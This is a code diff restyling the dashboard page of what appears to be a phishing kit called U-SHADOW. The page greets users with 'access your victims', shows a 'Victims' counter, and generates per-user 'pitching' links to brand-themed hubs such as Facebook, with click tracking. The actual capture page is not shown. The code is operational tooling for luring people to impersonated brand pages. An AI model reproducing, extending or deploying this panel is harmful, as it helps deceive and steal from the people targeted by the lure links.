@@ -27,47 +27,59 @@ foreach ($user_analytics as $click) {
     $cat = $click['category'];
     $cat_stats[$cat] = ($cat_stats[$cat] ?? 0) + 1;
 }
-$top_hub = empty($cat_stats) ? 'N/A' : array_keys($cat_stats, max($cat_stats))[0];
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>U-shadow | Dashboard</title>
+    <title>U-SHADOW | Dashboard</title>
     <link rel="stylesheet" href="/style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
-<body>
+<body class="old-dashboard-body">
 
-    <!-- Sidebar -->
-    <aside class="sidebar">
-        <div class="sidebar-brand">U-SHADOW</div>
-        <ul class="sidebar-menu">
-            <li><a href="dashboard.php" class="active"><i class="fa-solid fa-layer-group"></i> <span>Dashboard</span></a></li>
-            <li style="margin-top: 100px;"><a href="/logout.php"><i class="fa-solid fa-right-from-bracket"></i> <span>Sign Out</span></a></li>
-        </ul>
-    </aside>
-
-    <!-- Main Content -->
-    <main class="main-content">
-        <div style="text-align: center; margin-bottom: 20px;">
-            <a href="https://t.me/your_telegram" target="_blank" style="color: blue; text-decoration: underline; font-weight: 600; font-size: 18px;">Join Our Telegram</a>
+<div class="container-old">
+    <header class="header-old">
+        <div class="brand-top">U-SHADOW</div>
+        <div class="telegram-banner">
+             <a href="https://t.me/your_telegram" target="_blank" class="btn-telegram">
+                <i class="fab fa-telegram"></i> Join Our Telegram
+             </a>
         </div>
-        <header class="top-bar">
-            <div class="page-title">
-                <h1>.: Dashboard :.</h1>
-                <p>Welcome back, <strong><?php echo s($user['username']); ?></strong>!</p>
-            </div>
-        </header>
+    </header>
 
-        <section class="section">
-            <div class="section-header" style="display: block; text-align: center; border-bottom: 1px solid #eee; padding-bottom: 20px; margin-bottom: 30px;">
-                <h2 style="font-size: 28px; color: var(--dark);">LOGO HUB</h2>
-                <p style="font-size: 16px; color: var(--gray);">Select a professional brand hub to generate your personalized tracking link.</p>
+    <nav class="navbar-old">
+        <ul>
+            <li><a href="index.php"><i class="fas fa-home"></i> Home</a></li>
+            <li><a href="signup.php"><i class="fas fa-user-plus"></i> Sign Up</a></li>
+            <li><a href="#"><i class="fas fa-cut"></i> Short Your Link</a></li>
+            <li><a href="#"><i class="fab fa-facebook"></i> Facebook</a></li>
+            <li><a href="#"><i class="fas fa-envelope"></i> Contact</a></li>
+            <li><a href="logout.php"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
+        </ul>
+    </nav>
+
+    <main class="main-old">
+        <div class="breadcrumb-old">.: Dashboard :.</div>
+        <div class="welcome-msg">
+            Welcome back, <strong><?php echo s($user['username']); ?></strong>!<br>
+            You can now access your victims and manage your account.
+        </div>
+
+        <section class="panel-old">
+            <div class="panel-header-old">Your Statistics</div>
+            <div class="panel-body-old">
+                <p>Victims: <?php echo $clicks_count; ?></p>
+                <p>Links generated: <?php echo count($categories); ?></p>
             </div>
-            <div class="section-content">
-                <div class="link-grid">
+        </section>
+
+        <section class="panel-old">
+            <div class="panel-header-old">Generate Links</div>
+            <div class="panel-body-old">
+                <p>Select a category to generate your pitching link:</p>
+                <div class="link-grid-old">
                     <?php
                     $icons = [
                         'facebook' => 'fa-brands fa-facebook',
@@ -93,25 +105,19 @@ $top_hub = empty($cat_stats) ? 'N/A' : array_keys($cat_stats, max($cat_stats))[0
                         $icon_class = $icons[$cat_clean] ?? 'fa-solid fa-link';
                         $generated_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]/hub.php?cat=" . $cat_clean . "&user=" . urlencode($user['username']);
                     ?>
-                        <div class="link-item" style="background: #fff; border: 1px solid #eee; border-radius: 12px; padding: 25px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 250px;">
-                            <div class="platform" style="margin-bottom: 20px; width: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center;">
-                                <div style="width: 100px; height: 100px; background: #f8fafc; border-radius: 20px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; border: 1px solid #f1f5f9; overflow: hidden; box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);">
-                                    <?php if ($cat_image): ?>
-                                        <img src="<?php echo s($cat_image); ?>" alt="<?php echo s($cat_name); ?>" style="width: 80%; height: 80%; object-fit: contain;">
-                                    <?php else: ?>
-                                        <i class="<?php echo $icon_class; ?>" style="font-size: 40px; color: var(--primary);"></i>
-                                    <?php endif; ?>
+                        <div class="link-box-old">
+                            <div class="link-box-header"><?php echo s($cat_name); ?></div>
+                            <div class="link-box-body">
+                                <?php if ($cat_image): ?>
+                                    <img src="<?php echo s($cat_image); ?>" alt="<?php echo s($cat_name); ?>" class="hub-logo-small">
+                                <?php else: ?>
+                                    <i class="<?php echo $icon_class; ?>"></i>
+                                <?php endif; ?>
+                                <div class="copy-container-old">
+                                    <input type="text" value="<?php echo s($generated_link); ?>" id="link-<?php echo $cat_clean; ?>" readonly>
+                                    <button onclick="copyLink('link-<?php echo $cat_clean; ?>', this)">Copy</button>
                                 </div>
-                                <span style="font-size: 20px; font-weight: 800; color: #1e293b; letter-spacing: -0.5px;"><?php echo s($cat_name); ?></span>
-                            </div>
-                            <div class="copy-box" style="border-radius: 4px; border: 1px solid #999;">
-                                <input type="text" value="<?php echo s($generated_link); ?>" id="link-<?php echo $cat_clean; ?>" readonly style="font-size: 11px;">
-                            </div>
-                            <div style="margin-top: 10px; display: flex; justify-content: space-between; align-items: center;" id="actions-<?php echo $cat_clean; ?>">
-                                <button onclick="copyLink('link-<?php echo $cat_clean; ?>', this)" class="btn-preview" style="background: #f0f0f0; border: 1px solid #999; color: #333; padding: 2px 8px; font-size: 11px;">Copy Link</button>
-                                <div style="font-size: 10px; color: var(--gray);">
-                                    <span>Clicks: <?php echo $cat_stats[$cat_clean] ?? 0; ?></span>
-                                </div>
+                                <div class="click-count">Clicks: <?php echo $cat_stats[$cat_clean] ?? 0; ?></div>
                             </div>
                         </div>
                     <?php endforeach; ?>
@@ -120,31 +126,26 @@ $top_hub = empty($cat_stats) ? 'N/A' : array_keys($cat_stats, max($cat_stats))[0
         </section>
     </main>
 
-    <footer>
-        &copy; 2010-2025 | <strong>U-SHADOW Professional v3.5</strong> | All Rights Reserved. <br>
-        <a href="terms.php" style="color: #888; text-decoration: none;">Terms of Service</a> |
-        <a href="privacy.php" style="color: #888; text-decoration: none;">Privacy Policy</a> |
-        <a href="/admin/login.php" style="color: #888; text-decoration: none;"><i class="fas fa-lock"></i> Admin Portal</a>
+    <footer class="footer-old">
+        Copyright 2010-2025 | This Website Is Devlopped By K24KDX <br>
+        <strong>U-SHADOW v3.5 &copy;</strong>
     </footer>
+</div>
 
-    <script>
-        function copyLink(id, btn) {
-            var copyText = document.getElementById(id);
-            copyText.select();
-            copyText.setSelectionRange(0, 99999);
-            navigator.clipboard.writeText(copyText.value);
+<script>
+function copyLink(id, btn) {
+    var copyText = document.getElementById(id);
+    copyText.select();
+    copyText.setSelectionRange(0, 99999);
+    navigator.clipboard.writeText(copyText.value);
 
-            var originalText = btn.innerHTML;
-            var originalBg = btn.style.background;
-            btn.innerHTML = "DONE!";
-            btn.style.background = "#10b981";
-            btn.style.color = "#fff";
-            setTimeout(function() {
-                btn.innerHTML = originalText;
-                btn.style.background = originalBg;
-                btn.style.color = "#333";
-            }, 1500);
-        }
-    </script>
+    var originalText = btn.innerHTML;
+    btn.innerHTML = "Copied!";
+    setTimeout(function() {
+        btn.innerHTML = originalText;
+    }, 1500);
+}
+</script>
+
 </body>
 </html>
